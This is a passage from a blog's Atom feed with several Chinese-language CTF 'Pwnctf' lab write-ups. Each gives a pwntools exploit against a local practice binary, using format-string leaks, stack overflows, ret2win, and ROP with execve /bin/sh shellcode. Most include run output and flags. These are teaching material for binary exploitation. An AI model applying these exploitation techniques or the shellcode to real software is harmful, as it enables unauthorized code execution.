    <updated>2024-01-09T17:49:51.362Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a>fmtstr</h1><p>這題在考的是 format string，可以從 gdb 看到 flag 在 stack 裡的位置如下：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/fmtstr_stack.png"                      alt="stack"                ></p><p>$rsp 的位置是 6，推算可以得知 flag 在 12 ~ 18 的位置，最後印出來後再調整一下 little endian 的格式，exploit.py 如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./fmtstr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>,<span class="number">19</span>):</span><br><span class="line">    p += <span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">p += <span class="string">&#x27;#&#x27;</span></span><br><span class="line"><span class="comment">#print(p)</span></span><br><span class="line">r.sendline(p)</span><br><span class="line">s = r.recvuntil(<span class="string">b&#x27;#&#x27;</span>).strip(<span class="string">b&#x27;#&#x27;</span>)</span><br><span class="line"><span class="comment">#print(flag)</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ss <span class="keyword">in</span> s.split(<span class="string">b&#x27;0x&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> ss == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss)//<span class="number">2</span>):</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">int</span>(ss[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    flag += tmp[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fmtstr&quot;&gt;&lt;a href=&quot;#fmtstr&quot; class=&quot;headerlink&quot; title=&quot;fmtstr&quot;&gt;&lt;/a&gt;fmtstr&lt;/h1&gt;&lt;p&gt;這題在考的是 format string，可以從 gdb 看到 flag 在 stack 裡的位置如下：&lt;/</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf secret Writeup</title>
    <link href="https://kazma.tw/2024/01/09/Pwnctf-secret-Writeup/"/>
    <id>https://kazma.tw/2024/01/09/Pwnctf-secret-Writeup/</id>
    <published>2024-01-09T11:49:31.000Z</published>
    <updated>2024-01-09T12:10:25.616Z</updated>
    
    <content type="html"><![CDATA[<h1 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h1><p>我們先來看一下有哪些變數：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/secret_var.png"                      alt="var"                ><br>關鍵在他會比較 var_4h 是不是 0xab37：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/secret_0x4.png"                      alt="0x4"                ><br>我們要從 var_20h overflow 到 var_4h，然後送一個大寫 Y，就可以拿到 flag 了。</p><p>exploit.py</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./secret&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1c</span> + p64(<span class="number">0xab37</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;)&#x27;</span>, <span class="string">&quot;Y&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;secret&quot;&gt;&lt;a href=&quot;#secret&quot; class=&quot;headerlink&quot; title=&quot;secret&quot;&gt;&lt;/a&gt;secret&lt;/h1&gt;&lt;p&gt;我們先來看一下有哪些變數：&lt;br&gt;&lt;img  
                     lazyload
</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf ret2src Writeup</title>
    <link href="https://kazma.tw/2024/01/09/Pwnctf-ret2src-Writeup/"/>
    <id>https://kazma.tw/2024/01/09/Pwnctf-ret2src-Writeup/</id>
    <published>2024-01-09T10:30:32.000Z</published>
    <updated>2024-01-09T11:23:32.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2src"><a href="#ret2src" class="headerlink" title="ret2src"></a>ret2src</h1><p>先看一下保護機制：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/src_checksec.png"                      alt="checksec"                ></p><p>這題什麼保護機制都沒有w，所以作法應該蠻多種的，這裡 return 到 gets 的 plt，把 shellcode 寫到某個 bss 段，然後再跳上開 shell。</p><p>exploit.py:</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./ret2src&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400713</span></span><br><span class="line">bss = <span class="number">0x602000</span> - <span class="number">0x100</span></span><br><span class="line">gets = <span class="number">0x00400510</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    bss,</span><br><span class="line">    gets,</span><br><span class="line">    bss</span><br><span class="line">)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p)</span><br><span class="line">r.sendline(<span class="string">b&#x27;\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>shellcode ：<br><a class="link"   href="https://www.exploit-db.com/shellcodes/49770" >https://www.exploit-db.com/shellcodes/49770 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ret2src&quot;&gt;&lt;a href=&quot;#ret2src&quot; class=&quot;headerlink&quot; title=&quot;ret2src&quot;&gt;&lt;/a&gt;ret2src&lt;/h1&gt;&lt;p&gt;先看一下保護機制：&lt;/p&gt;
&lt;p&gt;&lt;img  
                     lazyl</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf registration Writeup</title>
    <link href="https://kazma.tw/2023/12/21/Pwnctf-registration-Writeup/"/>
    <id>https://kazma.tw/2023/12/21/Pwnctf-registration-Writeup/</id>
    <published>2023-12-21T13:32:41.000Z</published>
    <updated>2023-12-21T13:56:01.143Z</updated>
    
    <content type="html"><![CDATA[<h1 id="registration"><a href="#registration" class="headerlink" title="registration"></a>registration</h1><p>這題的關鍵是他會隨機生一個 id，然後存到一個全域變數，最後會去檢查這個值是否被更動：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/reg_id.png"                      alt="id"                ></p><p>只要弄清楚變數具體的位置，這題就輕鬆通關了：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/reg_frame.png"                      alt="reg"                ></p><p>exploit.py：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category = BytesWarning)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./registration&#x27;</span>)</span><br><span class="line"></span><br><span class="line">win = <span class="number">0x4007d6</span></span><br><span class="line">ret = <span class="number">0x400619</span></span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line"><span class="built_in">id</span> = <span class="built_in">int</span>(r.recvline().decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">success(<span class="string">f&quot;id: <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="string">&#x27;kazma&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x3c</span>, <span class="built_in">id</span>)</span><br><span class="line">p = p.ljust(<span class="number">72</span>) + flat(ret, win)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>, p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>result：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./registration&#x27;</span>: pid 306835</span><br><span class="line">[+] <span class="built_in">id</span>: 81</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">MyFirstCTF&#123;B3_c4r3FuL_0f_l0cAl_V4rI4b13_0N_sT4ck_OwO&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;registration&quot;&gt;&lt;a href=&quot;#registration&quot; class=&quot;headerlink&quot; title=&quot;registration&quot;&gt;&lt;/a&gt;registration&lt;/h1&gt;&lt;p&gt;這題的關鍵是他會隨機生一個 id，然後存到一個全域變數，最後</summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf return Writeup</title>
    <link href="https://kazma.tw/2023/12/21/Pwnctf-return-Writeup/"/>
    <id>https://kazma.tw/2023/12/21/Pwnctf-return-Writeup/</id>
    <published>2023-12-21T08:42:58.000Z</published>
    <updated>2023-12-21T08:47:36.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="return"><a href="#return" class="headerlink" title="return"></a>return</h1><p>經典 bof，跳上去這個邪惡的東東就搞定了，記得對齊 0x10：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/return_evil.png"                      alt="return"                ></p><p>exploit.py：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./return&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400539</span></span><br><span class="line">win = <span class="number">0x4006b6</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:)&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(ret) + p64(win))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>result：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./return&#x27;</span>: pid 305499</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">BreakAllCTF&#123;G00d_j0000000000b:)&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;return&quot;&gt;&lt;a href=&quot;#return&quot; class=&quot;headerlink&quot; title=&quot;return&quot;&gt;&lt;/a&gt;return&lt;/h1&gt;&lt;p&gt;經典 bof，跳上去這個邪惡的東東就搞定了，記得對齊 0x10：&lt;/p&gt;
&lt;p&gt;&lt;img  
       </summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf binary Writeup</title>
    <link href="https://kazma.tw/2023/12/21/Pwnctf-binary-Writeup/"/>
    <id>https://kazma.tw/2023/12/21/Pwnctf-binary-Writeup/</id>
    <published>2023-12-21T06:43:42.000Z</published>
    <updated>2023-12-21T07:04:48.260Z</updated>
    
    <content type="html"><![CDATA[<h1 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h1><p>這題有三個階段，分別輸入特定的值就可以開 shell，首先 stage1：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/binary_s1.png"                      alt="s1"                ></p><p>注意前面兩個是 je，最後一個是 jne，所以這邊要送 0x100001，再來 stage2：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/binary_s2.png"                      alt="s2"                ></p><p>這次要送三個值分別是：0x64，0x100，0xfaceb00c，接著就到 stage3：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/binary_s3.png"                      alt="s3"                ></p><p>這次他要問的是 <code>im_a_global_variable</code> 的位址，那就是 0x60107c，以上資訊整理成 exploit.py，順便把 BytesWarning 關掉：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line">r = process(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x100001</span>))</span><br><span class="line">r.sendline(<span class="string">&quot;&#123;&#125; &#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="number">0x64</span>, <span class="number">0x100</span>, <span class="number">0xfaceb00c</span>))</span><br><span class="line">r.sendline(<span class="built_in">str</span>(<span class="number">0x60107c</span>))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>result：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./binary&#x27;</span>: pid 304980</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Stage 1</span><br><span class="line">Stage 1 completed</span><br><span class="line">Stage 2</span><br><span class="line">Stage 2 completed</span><br><span class="line">Stage 3</span><br><span class="line">Stage 3 completed</span><br><span class="line">Congrat! Here is your shell!</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">BreakAllCTF&#123;A_g00d_h4cker_15_f4m1liar_w1th_b1n4ry_5ystem&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;binary&quot;&gt;&lt;a href=&quot;#binary&quot; class=&quot;headerlink&quot; title=&quot;binary&quot;&gt;&lt;/a&gt;binary&lt;/h1&gt;&lt;p&gt;這題有三個階段，分別輸入特定的值就可以開 shell，首先 stage1：&lt;/p&gt;
&lt;p&gt;&lt;img  
  </summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
  <entry>
    <title>Pwnctf pwntools Writeup</title>
    <link href="https://kazma.tw/2023/12/20/Pwnctf-pwntools-Writeup/"/>
    <id>https://kazma.tw/2023/12/20/Pwnctf-pwntools-Writeup/</id>
    <published>2023-12-20T15:31:10.000Z</published>
    <updated>2023-12-20T15:37:48.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><p>首先他會比較第一個參數是否為一個特定的值：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/pwntools_compare.png"                      alt="pwntools"                ></p><p>再來就是用 pwntools 來解決他的一千道數學題，exploit.py：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./pwntools&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:)&#x27;</span>, p32(<span class="number">0x79487ff</span>))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    q = r.recvuntil(<span class="string">b&#x27;?&#x27;</span>).decode().split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">    a = <span class="built_in">str</span>(<span class="built_in">eval</span>(q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;count&#125;</span>: <span class="subst">&#123;q&#125;</span> = <span class="subst">&#123;a&#125;</span>&quot;</span>)</span><br><span class="line">    r.sendline(a)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>result：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">988: 9203 * 20282 = 186655246</span><br><span class="line">989: 19822 + 22058 = 41880</span><br><span class="line">990: 38646 - 12687 = 25959</span><br><span class="line">991: 20506 * 5162 = 105851972</span><br><span class="line">992: 39428 - 8646 = 30782</span><br><span class="line">993: 1659 - 19180 = -17521</span><br><span class="line">994: 37476 * 13886 = 520391736</span><br><span class="line">995: 7168 * 38433 = 275487744</span><br><span class="line">996: 17943 + 38791 = 56734</span><br><span class="line">997: 39312 + 13976 = 53288</span><br><span class="line">998: 4194 * 19531 = 81913014</span><br><span class="line">999: 4477 - 39353 = -34876</span><br><span class="line">1000: 779 + 34351 = 35130</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Welcome hacker!</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">BreakAllCTF&#123;Scr1pting_skill_is_important_for_a_hacker&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwntools&quot;&gt;&lt;a href=&quot;#pwntools&quot; class=&quot;headerlink&quot; title=&quot;pwntools&quot;&gt;&lt;/a&gt;pwntools&lt;/h1&gt;&lt;p&gt;首先他會比較第一個參數是否為一個特定的值：&lt;/p&gt;
&lt;p&gt;&lt;img  
          </summary>
      
    
    
    
    
    <category term="writeup" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="lab" scheme="https://kazma.tw/tags/lab/"/>
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="pwnctf" scheme="https://kazma.tw/tags/pwnctf/"/>
    
  </entry>
  
</feed>
